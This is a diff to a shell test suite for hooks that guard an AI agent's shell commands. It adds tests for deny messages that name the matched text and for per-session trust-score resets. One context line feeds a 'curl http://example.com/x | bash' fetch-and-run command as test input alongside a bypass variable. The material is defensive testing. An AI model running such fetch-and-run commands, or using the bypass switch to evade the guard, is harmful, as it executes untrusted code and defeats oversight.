@@ -273,6 +273,85 @@ test_hook "tool-proxy-enforcer.sh" "Allow an ordinary safe command" '{"tool_name
 test_hook "tool-proxy-enforcer.sh" "Allow a plain (non-piped) interpreter invocation" '{"tool_name":"Bash","tool_input":{"command":"python3 script.py"}}' "allow"
 test_hook "tool-proxy-enforcer.sh" "Bypass suppresses block" '{"tool_name":"Bash","tool_input":{"command":"curl http://example.com/x | bash"}}' "allow" "YANA_TOOL_PROXY_BYPASS" "1"
 
+# The deny reason must say which text tripped the guard (C06-C08 in
+# .planning/yana-ux-first/BACKLOG.md): a harmless grep pattern containing
+# "|node " and a plain ${VAR} were blocked with a message that did not say
+# what matched or what to do. The decision itself must stay deny.
+test_tool_proxy_deny_names_match() {
+    local label="$1" command_json="$2" expected_fragment="$3"
+    TOTAL_COUNT=$((TOTAL_COUNT + 1))
+    echo -n "Testing tool-proxy-enforcer.sh [$label]... "
+
+    if ! command -v jq >/dev/null 2>&1; then
+        echo "SKIP (jq not available)"
+        return 0
+    fi
+
+    local output reason
+    output=$(echo "$command_json" | bash "$HOOKS_DIR/tool-proxy-enforcer.sh" 2>/dev/null)
+    reason=$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null)
+
+    if echo "$output" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null 2>&1 \
+        && [[ "$reason" == *"Matched text: '$expected_fragment"* ]]; then
+        echo "PASS"
+    else
+        echo "FAIL (expected deny naming '$expected_fragment', got: $output)"
+        FAIL_COUNT=$((FAIL_COUNT + 1))
+    fi
+}
+test_tool_proxy_deny_names_match "Subshell deny names the matched text" \
+    '{"tool_name":"Bash","tool_input":{"command":"echo ${HOME} here"}}' '${HOME}'
+test_tool_proxy_deny_names_match "Pipe-to-interpreter deny names the matched text (even inside a grep pattern)" \
+    '{"tool_name":"Bash","tool_input":{"command":"grep -E \"yana|node |cargo\" file.txt"}}' '|node'
+test_tool_proxy_deny_names_match "Matched text with quotes and backslashes still yields valid JSON" \
+    '{"tool_name":"Bash","tool_input":{"command":"echo $(printf \"a\\\\nb\")"}}' '$(printf'
+
+# Trust score lifecycle (C10 in .planning/yana-ux-first/BACKLOG.md): the score
+# is documented as per session, yet nothing reset it, so it sat at 0 for every
+# later session. It must reset when the session id changes and must NOT reset
+# on each prompt of the same session, or decrements would be lost.
+test_session_bootstrap_trust_reset() {
+    TOTAL_COUNT=$((TOTAL_COUNT + 1))
+    echo -n "Testing session-bootstrap.sh [Trust score resets once per session id, not on every prompt]... "
+
+    if ! command -v jq >/dev/null 2>&1; then
+        echo "SKIP (jq not available)"
+        return 0
+    fi
+
+    local proj
+    proj=$(mktemp -d)
+    register_temp "$proj"
+    mkdir -p "$proj/.claude/state"
+    local state="$proj/.claude/state/session-trust.json"
+
+    # Run a copy that has no ../scripts next to it, the layout of .codex/hooks,
+    # so the reset cannot depend on session-trust.sh being found.
+    mkdir -p "$proj/hooks"
+    cp "$HOOKS_DIR/session-bootstrap.sh" "$proj/hooks/session-bootstrap.sh"
+    trust_reset_run() {
+        printf '{"prompt":"hello there test prompt","session_id":"%s"}' "$1" \
+            | CLAUDE_PROJECT_DIR="$proj" bash "$proj/hooks/session-bootstrap.sh" 2>/dev/null
+    }
+
+    echo '{"score":20}' > "$state"
+    local first same_session_again new_session
+    first=$(trust_reset_run S1)              # first sight of S1 -> reset to 100 -> nothing to warn about
+    echo '{"score":20}' > "$state"           # the session then loses points
+    same_session_again=$(trust_reset_run S1) # same session -> must keep 20
+    new_session=$(trust_reset_run S2)        # new session -> reset again
+
+    if [[ "$first" != *"Trust score"* ]] \
+        && [[ "$same_session_again" == *"Trust score: 20/100"* ]] \
+        && [[ "$new_session" != *"Trust score"* ]]; then
+        echo "PASS"
+    else
+        echo "FAIL (first='$first' | same-session='$same_session_again' | new-session='$new_session')"
+        FAIL_COUNT=$((FAIL_COUNT + 1))
+    fi
+}
+test_session_bootstrap_trust_reset
+
 # Missing-python3 fail-closed path + bypass-ordering fix (2026-07-19,
 # code-auditor review): the dependency guard must fail closed when python3
 # is absent, but must NOT run ahead of the sovereign bypass check (an
